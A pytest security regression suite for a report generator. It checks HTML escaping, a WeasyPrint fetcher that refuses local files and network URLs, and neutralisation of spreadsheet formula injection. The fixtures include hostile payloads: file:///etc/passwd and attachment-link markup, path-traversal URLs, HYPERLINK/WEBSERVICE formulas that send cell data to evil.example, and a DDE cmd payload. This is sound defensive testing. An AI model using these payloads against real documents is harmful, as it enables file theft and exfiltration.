"""Security regressions for scripts/google_report.py.

Covers the three reported issues: HTML injection into the report markup,
WeasyPrint reading local files or the network while rendering the PDF, and
spreadsheet formula injection in the XLSX export.
"""

from __future__ import annotations

import os
import struct
import sys
import zipfile
import zlib
from pathlib import Path

import pytest

_SCRIPTS = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scripts")
if _SCRIPTS not in sys.path:
    sys.path.insert(0, _SCRIPTS)

import google_report  # noqa: E402


def _png_bytes() -> bytes:
    """Return a valid 1x1 PNG without needing an imaging library."""
    def chunk(kind: bytes, data: bytes) -> bytes:
        body = kind + data
        return struct.pack(">I", len(data)) + body + struct.pack(">I", zlib.crc32(body))

    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
        + chunk(b"IDAT", zlib.compress(b"\x00\xff\x00\x00"))
        + chunk(b"IEND", b"")
    )


def _hostile(tag: str) -> str:
    return f'<b id={tag}>"x\'&'


def _escaped(tag: str) -> str:
    return f"&lt;b id={tag}&gt;&quot;x&#x27;&amp;"


def _hostile_report_data() -> dict:
    return {
        "psi": {
            "lighthouse_scores": {"performance": 40, "accessibility": 80, "best-practices": 70, "seo": 60},
            "lab_metrics": {_hostile("labkey"): {"score": 0.3, "display": _hostile("labdisplay")}},
            "failed_audits": [{"title": _hostile("failtitle"), "score": 0.1, "display": _hostile("faildisplay")}],
            "seo_audits": [{"title": _hostile("seotitle"), "pass": False}],
            "accessibility_audits": [{"title": _hostile("a11ytitle"), "score": 0.2}],
            "opportunities": [{"title": _hostile("opptitle"), "savings_ms": 900}],
        },
        "crux": {
            "metrics": {
                "largest_contentful_paint": {
                    "label": _hostile("cruxlabel"),
                    "rating": _hostile("cruxrating"),
                    "unit": _hostile("cruxunit"),
                    "p75": 2400,
                    "distribution": {"good": 70, "needs_improvement": 20, "poor": 10},
                },
            },
            "collection_period": {"first": _hostile("cpfirst"), "last": _hostile("cplast")},
        },
        "crux_history": {
            "trends": {
                "lcp": {
                    "label": _hostile("trendlabel"),
                    "direction": _hostile("trenddir"),
                    "change_pct": 1.5,
                    "earliest_avg": _hostile("trendearly"),
                    "latest_avg": _hostile("trendlate"),
                },
            },
        },
        "gsc": {
            "property": _hostile("gscproperty"),
            "date_range": {"start": _hostile("gscstart"), "end": _hostile("gscend")},
            "totals": {"clicks": 10, "impressions": 500, "ctr": 2.0},
            "row_count": 2,
            "rows": [
                {"query": _hostile("gscquery"), "clicks": 5, "impressions": 300, "ctr": 1.6, "position": 4.2},
                {"query": "shoes & boots", "clicks": 5, "impressions": 200, "ctr": 2.5, "position": 12.0},
            ],
            "quick_wins": [
                {"keys": [_hostile("quickwin")], "clicks": 1, "impressions": 100, "position": 5.0},
            ],
        },
        "inspection": {
            "total": 2,
            "summary": {"pass": 1, "fail": 1},
            "results": [
                {
                    "url": _hostile("inspecturl"),
                    "verdict": _hostile("inspectverdict"),
                    "index_status": {
                        "coverage_state": _hostile("inspectcoverage"),
                        "last_crawl_time": _hostile("crawl"),
                    },
                },
                {"url": "https://example.com/b", "verdict": "FAIL", "error": _hostile("inspecterror")},
            ],
            "rich_results": [{"url": _hostile("richurl"), "type": _hostile("richtype")}],
        },
    }


RENDERED_TAGS = [
    "labkey", "labdisplay", "failtitle", "faildisplay", "seotitle", "a11ytitle",
    "opptitle", "cruxlabel", "cruxrating", "cruxunit", "cpfirst", "cplast",
    "trendlabel", "trenddir", "trendearly", "trendlate", "gscproperty",
    "gscstart", "gscend", "gscquery", "quickwin", "inspecturl",
    "inspectverdict", "inspectcoverage", "inspecterror", "richurl", "richtype",
]


def _full_html(tmp_path: Path, domain: str = "example.com", data: dict | None = None) -> str:
    result = google_report.generate_report(
        "full", data or _hostile_report_data(), domain, tmp_path, output_format="html",
    )
    assert result["error"] is None
    return Path(result["files"][0]).read_text(encoding="utf-8")


# ── 1. HTML injection ────────────────────────────────────────────────────────

def test_api_strings_are_escaped_everywhere_in_the_html(tmp_path: Path) -> None:
    pytest.importorskip("matplotlib")
    html = _full_html(tmp_path)

    assert "<b id=" not in html
    for tag in RENDERED_TAGS:
        # Ratings and trend directions are upper-cased by the report.
        assert _escaped(tag).lower() in html.lower(), f"{tag} missing or not escaped"


def test_values_are_escaped_exactly_once(tmp_path: Path) -> None:
    pytest.importorskip("matplotlib")
    html = _full_html(tmp_path)

    assert "shoes &amp; boots" in html
    assert "&amp;amp;" not in html
    assert "&amp;lt;" not in html
    # Section titles written as entities by the generator stay single-escaped.
    assert "Core Web Vitals &amp; Performance" in html


def test_gsc_query_markup_cannot_reference_local_files(tmp_path: Path) -> None:
    pytest.importorskip("matplotlib")
    data = {
        "gsc": {
            "totals": {"clicks": 1, "impressions": 10, "ctr": 1.0},
            "rows": [{
                "query": '<img src="file:///etc/passwd"><link rel="attachment" href="file:///etc/passwd">',
                "clicks": 1, "impressions": 10, "ctr": 1.0, "position": 2.0,
            }],
        },
    }
    result = google_report.generate_report("gsc-performance", data, "example.com", tmp_path, output_format="html")
    html = Path(result["files"][0]).read_text(encoding="utf-8")

    assert "file:///etc/passwd" in html
    assert '<img src="file:///etc/passwd"' not in html
    assert "<link" not in html


def test_inspection_fields_are_escaped_in_the_indexation_report(tmp_path: Path) -> None:
    pytest.importorskip("matplotlib")
    data = _hostile_report_data()["inspection"]
    result = google_report.generate_report("indexation", data, "example.com", tmp_path, output_format="html")
    html = Path(result["files"][0]).read_text(encoding="utf-8")

    assert "<b id=" not in html
    for tag in ("inspecturl", "inspectverdict", "inspectcoverage", "inspecterror", "richurl", "richtype"):
        assert _escaped(tag) in html


def test_hostile_domain_cannot_leave_the_heading_or_the_style_block(tmp_path: Path) -> None:
    domain = 'x"; } </style><b id=dom><img src="file:///etc/passwd">'
    html = _full_html(tmp_path, domain=domain, data={"summary": {"health_score": 80}})

    assert "<b id=dom>" not in html
    assert html.count("</style>") == 1
    assert '<img src="file:///etc/passwd"' not in html
    assert "&lt;b id=dom&gt;" in html
    css = html.split("<style>", 1)[1].split("</style>", 1)[0]
    assert '"x\\000022\\00003b \\00007d \\00003c/style\\00003e' in css


def test_css_string_keeps_plain_domains_readable() -> None:
    assert google_report._css_string("shop.example-site.com") == "shop.example-site.com"
    assert google_report._css_string('a"b\\c\n') == "a\\000022b\\00005cc\\00000a"


def test_chart_and_metric_helpers_escape_their_arguments(tmp_path: Path) -> None:
    chart = tmp_path / 'a"b <c>.png'
    html = google_report._chart_html(str(chart), "<i>cap</i>", 1, '"><script>')
    assert "<script>" not in html and "<i>" not in html
    assert 'src="file:///' in html
    assert "%22" in html and "%3C" in html

    card = google_report._metric_card("<b>1</b>", "<u>label</u>", '"onload="x')
    assert "<b>" not in card and "<u>" not in card and '"onload="' not in card


# ── 2. WeasyPrint URL fetching ───────────────────────────────────────────────

@pytest.fixture()
def assets(tmp_path: Path) -> dict:
    charts = tmp_path / "out" / "charts"
    charts.mkdir(parents=True)
    chart = charts / "top_queries.png"
    chart.write_bytes(_png_bytes())
    stale = charts / "stale.png"
    stale.write_bytes(_png_bytes())
    bundled = tmp_path / "bundled" / "charts"
    bundled.mkdir(parents=True)
    logo = bundled / "google_logo.png"
    logo.write_bytes(_png_bytes())
    secret = tmp_path / "secret.png"
    secret.write_bytes(_png_bytes())
    secret_txt = tmp_path / "secret.txt"
    secret_txt.write_text("TOP-SECRET-MARKER", encoding="utf-8")
    link = charts / "link.png"
    link.symlink_to(secret)
    return {
        "charts": charts, "chart": chart, "stale": stale, "logo": logo,
        "secret": secret, "secret_txt": secret_txt, "link": link,
        "allowed": [(chart, charts), (link, charts), (logo, bundled)],
    }


def test_resolver_allows_only_the_reports_own_chart_and_logo(assets: dict) -> None:
    resolve = google_report._resolve_report_resource
    allowed = assets["allowed"]

    assert resolve(assets["chart"].as_uri(), allowed) == os.path.realpath(assets["chart"])
    assert resolve(assets["logo"].as_uri(), allowed) == os.path.realpath(assets["logo"])
    assert resolve("file://localhost" + str(assets["chart"]), allowed) == os.path.realpath(assets["chart"])


@pytest.mark.parametrize("url", [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "http://127.0.0.1/x.png",
    "https://example.com/x.png",
    "ftp://example.com/x.png",
    "data:image/png;base64,iVBORw0KGgo=",
    "//example.com/x.png",
    "/etc/passwd",
    "",
])
def test_resolver_refuses_foreign_urls(assets: dict, url: str) -> None:
    assert google_report._resolve_report_resource(url, assets["allowed"]) is None


def test_resolver_refuses_other_files_traversal_symlinks_and_remote_hosts(assets: dict) -> None:
    resolve = google_report._resolve_report_resource
    allowed = assets["allowed"]
    charts = assets["charts"]

    # A real file outside the allowed directories.
    assert resolve(assets["secret"].as_uri(), allowed) is None
    assert resolve(assets["secret_txt"].as_uri(), allowed) is None
    # A file inside the charts directory that this run did not generate.
    assert resolve(assets["stale"].as_uri(), allowed) is None
    # Path traversal out of the charts directory, plain and percent-encoded.
    assert resolve(f"file://{charts}/../../secret.png", allowed) is None
    assert resolve(f"file://{charts}/%2e%2e/%2e%2e/secret.png", allowed) is None
    assert resolve(f"file://{charts}/../../secret.txt", allowed) is None
    # A listed chart name that is a symlink pointing out of the directory.
    assert assets["link"].exists()
    assert resolve(assets["link"].as_uri(), allowed) is None
    # A file URL naming a remote host.
    assert resolve("file://evil.example" + str(assets["chart"]), allowed) is None
    # The directory itself.
    assert resolve(charts.as_uri(), allowed) is None


def test_resolver_follows_a_symlinked_output_directory(assets: dict, tmp_path: Path) -> None:
    alias = tmp_path / "alias"
    alias.symlink_to(assets["charts"], target_is_directory=True)
    via_alias = alias / "top_queries.png"

    resolved = google_report._resolve_report_resource(via_alias.as_uri(), [(via_alias, alias)])
    assert resolved == os.path.realpath(assets["chart"])


def test_fetcher_serves_allowed_images_and_raises_for_the_rest(assets: dict) -> None:
    pytest.importorskip("weasyprint")
    fetcher = google_report._make_report_url_fetcher(assets["allowed"])

    response = fetcher(assets["chart"].as_uri())
    assert response.read() == _png_bytes()
    assert response.content_type == "image/png"
    response.close()

    for url in ("file:///etc/passwd", "http://127.0.0.1/x.png", assets["secret"].as_uri(),
                assets["link"].as_uri(), f"file://{assets['charts']}/../../secret.png"):
        with pytest.raises(ValueError):
            fetcher(url)
        with pytest.raises(ValueError):
            fetcher.open(url)


def test_legacy_function_fetcher_applies_the_same_rules(assets: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(google_report, "URLFetcher", None)
    monkeypatch.setattr(google_report, "URLFetcherResponse", None)
    fetcher = google_report._make_report_url_fetcher(assets["allowed"])

    assert fetcher(assets["logo"].as_uri()) == {"string": _png_bytes(), "mime_type": "image/png"}
    with pytest.raises(ValueError):
        fetcher("file:///etc/passwd")


HOSTILE_MARKUP = (
    '<html><head>'
    '<link rel="attachment" href="{secret}">'
    '<link rel="stylesheet" href="{secret}">'
    '<link rel="stylesheet" href="http://127.0.0.1:9/x.css">'
    '<style>@import url("{secret}"); body {{ background: url("{secret_png}"); }}</style>'
    '</head><body><p>report</p>'
    '<img src="{chart}"><img src="{logo}">'
    '<img src="{secret_png}"><img src="{link}"><img src="http://127.0.0.1:9/x.png">'
    '<img src="file:///etc/passwd"><a rel="attachment" href="{secret}">a</a>'
    '</body></html>'
)


def _hostile_markup(assets: dict) -> str:
    return HOSTILE_MARKUP.format(
        secret=assets["secret_txt"].as_uri(), secret_png=assets["secret"].as_uri(),
        chart=assets["chart"].as_uri(), logo=assets["logo"].as_uri(), link=assets["link"].as_uri(),
    )


def test_real_pdf_render_omits_refused_resources_without_crashing(assets: dict, tmp_path: Path) -> None:
    weasyprint = pytest.importorskip("weasyprint")
    markup = _hostile_markup(assets)

    served = []
    fetcher = google_report._make_report_url_fetcher(assets["allowed"])
    original_fetch = fetcher.fetch

    def recording_fetch(url, headers=None):
        response = original_fetch(url, headers)
        served.append(url)
        return response

    fetcher.fetch = recording_fetch
    safe_pdf = tmp_path / "safe.pdf"
    weasyprint.HTML(string=markup, url_fetcher=fetcher).write_pdf(str(safe_pdf))
    safe = safe_pdf.read_bytes()

    assert safe.startswith(b"%PDF")
    assert sorted(served) == sorted([assets["chart"].as_uri(), assets["logo"].as_uri()])
    assert b"/EmbeddedFile" not in safe

    # The same markup with the default fetcher embeds the local file, which is
    # the behaviour the restrictive fetcher exists to stop.
    default_pdf = tmp_path / "default.pdf"
    weasyprint.HTML(string=markup).write_pdf(str(default_pdf))
    assert b"/EmbeddedFile" in default_pdf.read_bytes()


def test_generate_report_passes_a_restrictive_fetcher_to_weasyprint(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    pytest.importorskip("matplotlib")
    pytest.importorskip("weasyprint")
    bundled = tmp_path / "bundled" / "charts"
    bundled.mkdir(parents=True)
    logo = bundled / "google_logo.png"
    logo.write_bytes(_png_bytes())
    monkeypatch.setattr(google_report, "GOOGLE_LOGO_PATH", logo)

    captured = {}
    real_html = google_report.HTML

    def spy(*args, **kwargs):
        captured.update(kwargs)
        return real_html(*args, **kwargs)

    monkeypatch.setattr(google_report, "HTML", spy)
    out = tmp_path / "out dir"
    result = google_report.generate_report(
        "gsc-performance", _hostile_report_data()["gsc"], "example.com", out, output_format="pdf",
    )

    assert result["error"] is None
    pdf = Path(result["files"][0]).read_bytes()
    assert pdf.startswith(b"%PDF")
    # The chart and the logo are both embedded as images.
    assert pdf.count(b"/Subtype /Image") >= 2

    fetcher = captured.get("url_fetcher")
    assert fetcher is not None
    chart = out / "charts" / "top_queries.png"
    assert chart.is_file()
    assert fetcher(chart.as_uri()).read() == chart.read_bytes()
    assert fetcher(logo.as_uri()).read() == _png_bytes()
    for url in ("file:///etc/passwd", "https://example.com/x.png", (tmp_path / "x.png").as_uri()):
        with pytest.raises(ValueError):
            fetcher(url)


def test_relative_output_dir_still_embeds_charts(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    pytest.importorskip("matplotlib")
    pytest.importorskip("weasyprint")
    monkeypatch.chdir(tmp_path)
    result = google_report.generate_report(
        "gsc-performance", _hostile_report_data()["gsc"], "example.com", "rel", output_format="pdf",
    )

    assert result["error"] is None
    assert Path(result["files"][0]).read_bytes().count(b"/Subtype /Image") >= 1


# ── 3. XLSX formula injection ────────────────────────────────────────────────

DANGEROUS = [
    '=HYPERLINK("http://evil.example/?"&A1,"click")',
    "=WEBSERVICE(\"http://evil.example/\"&A2)",
    "=1+1",
    "+1+1",
    "-1+1",
    "@SUM(1+1)",
    "\t=1+1",
    "\r=1+1",
    "=",
    "#N/A",
]


def _xlsx_data() -> dict:
    return {
        "psi": {"lighthouse_scores": {"performance": 0.42, "seo": 91}},
        "crux": {"metrics": {value: {"p75": 2400, "category": value} for value in DANGEROUS}},
        "gsc": {
            "rows": [
                {"keys": [value], "clicks": 3, "impressions": 40, "ctr": 0.075, "position": 4.26}
                for value in DANGEROUS
            ] + [{"query": "plain query", "clicks": 1, "impressions": 2, "ctr": "=1+1", "position": "-2+3"}],
            "pages": [
                {"page": value, "clicks": 3, "impressions": 40, "ctr": 0.075, "position": 4.26}
                for value in DANGEROUS
            ],
        },
        "inspection": {
            "results": [
                {
                    "url": value,
                    "inspectionResult": {"indexStatusResult": {
                        "verdict": value, "coverageState": value, "indexingState": value,
                        "crawledAs": value, "lastCrawlTime": value,
                    }},
                }
                for value in DANGEROUS
            ],
        },
    }


def _load(path: str):
    openpyxl = pytest.importorskip("openpyxl")
    return openpyxl.load_workbook(path)


def test_xlsx_dangerous_strings_are_text_after_save_and_reload(tmp_path: Path) -> None:
    pytest.importorskip("openpyxl")
    path = google_report.generate_xlsx(_xlsx_data(), "=cmd|' /C calc'!A0", "full", tmp_path)
    wb = _load(path)

    seen = {value: 0 for value in DANGEROUS}
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for cell in row:
                assert cell.data_type != "f", f"formula cell at {ws.title}!{cell.coordinate}"
                if isinstance(cell.value, str):
                    assert cell.data_type == "s"
                    if cell.value.startswith(("=", "+", "-", "@", "\t", "\r")):
                        assert cell.quotePrefix is True
                if cell.value in seen:
                    seen[cell.value] += 1

    # Queries + pages + 6 indexation columns + metric name and rating, plus
    # the string CTR of the last query row for "=1+1".
    for value, count in seen.items():
        assert count == (11 if value == "=1+1" else 10), f"{value!r} stored {count} times"

    summary = wb["Summary"]
    assert summary["B2"].value == "=cmd|' /C calc'!A0"
    assert summary["B2"].data_type == "s"

    queries = wb["Queries"]
    last = queries.max_row
    assert queries.cell(row=last, column=4).value == "=1+1"
    assert queries.cell(row=last, column=4).data_type == "s"
    assert queries.cell(row=last, column=5).value == "-2+3"
    assert queries.cell(row=last, column=5).data_type == "s"


def test_xlsx_contains_no_formula_elements(tmp_path: Path) -> None:
    pytest.importorskip("openpyxl")
    path = google_report.generate_xlsx(_xlsx_data(), "=1+1", "full", tmp_path)

    with zipfile.ZipFile(path) as archive:
        sheets = [name for name in archive.namelist() if name.startswith("xl/worksheets/sheet")]
        assert len(sheets) == 4
        for name in sheets:
            xml = archive.read(name).decode("utf-8")
            assert "<f>" not in xml and "<f " not in xml
            assert 't="e"' not in xml


def test_xlsx_numbers_stay_numeric(tmp_path: Path) -> None:
    pytest.importorskip("openpyxl")
    wb = _load(google_report.generate_xlsx(_xlsx_data(), "example.com", "full", tmp_path))

    queries = wb["Queries"]
    assert [queries.cell(row=2, column=c).value for c in (2, 3, 5)] == [3, 40, 4.3]
    assert [queries.cell(row=2, column=c).data_type for c in (2, 3, 5)] == ["n", "n", "n"]
    assert queries.cell(row=2, column=4).value == "7.50%"

    summary = wb["Summary"]
    scores = {row[0].value: row[1] for row in summary.iter_rows() if row[0].value in ("Performance", "Seo")}
    assert scores["Performance"].value == 42 and scores["Performance"].data_type == "n"
    assert scores["Seo"].value == 91 and scores["Seo"].data_type == "n"


def test_xlsx_helper_handles_control_characters_and_odd_types(tmp_path: Path) -> None:
    openpyxl = pytest.importorskip("openpyxl")
    wb = openpyxl.Workbook()
    ws = wb.active
    google_report._xlsx_append_row(ws, ["=A1\x00\x07", ["=1+1"], {"a": 1}, None, 7, 1.5, True, "plain"])
    google_report._xlsx_append_row(ws, [])
    google_report._xlsx_append_row(ws, ["after blank", "=2+2"])
    path = tmp_path / "helper.xlsx"
    wb.save(path)
    ws = openpyxl.load_workbook(path).active

    assert [c.value for c in ws[1]] == ["=A1", "['=1+1']", "{'a': 1}", None, 7, 1.5, True, "plain"]
    assert [c.data_type for c in ws[1]] == ["s", "s", "s", "n", "n", "n", "b", "s"]
    assert ws["A1"].quotePrefix is True
    assert not ws["H1"].quotePrefix
    assert ws["B3"].value == "=2+2" and ws["B3"].data_type == "s"


def test_xlsx_filename_cannot_escape_the_output_directory(tmp_path: Path) -> None:
    pytest.importorskip("openpyxl")
    out = tmp_path / "out"
    out.mkdir()
    path = Path(google_report.generate_xlsx({}, "../../evil/=x", "full", out))

    assert path.parent == out
    assert path.is_file()
